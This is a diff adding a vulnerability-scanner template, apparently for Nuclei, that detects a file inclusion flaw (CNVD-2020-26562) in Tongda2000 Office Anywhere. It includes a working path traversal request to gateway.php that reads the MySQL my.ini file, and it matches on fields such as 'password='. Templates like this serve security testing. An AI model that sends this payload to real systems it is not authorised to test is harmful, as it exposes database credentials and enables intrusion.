@@ -1,0 +1,36 @@
+id: tongda2000-office_anywhere-file_inclusion-CNVD-2020-26562
+info:
+  name: Tongda2000 Office Anywhere File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Tongda2000 Office Anywhere contains a file inclusion vulnerability that allows attackers to access sensitive configuration files.
+  reference:
+    - https://www.hacking8.com/bug-web/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html
+
+http:
+  - raw:
+      - |
+        POST /ispirit/interface/gateway.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        json={"url":"/general/../../mysql5/my.ini"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[mysql]"
+          - "password="
+          - "basedir="
+          - "datadir="
+          - "tmpdir="
+          - "innodb_data_home_dir="
+      - type: word
+        part: header
+        words:
+          - "text/html"
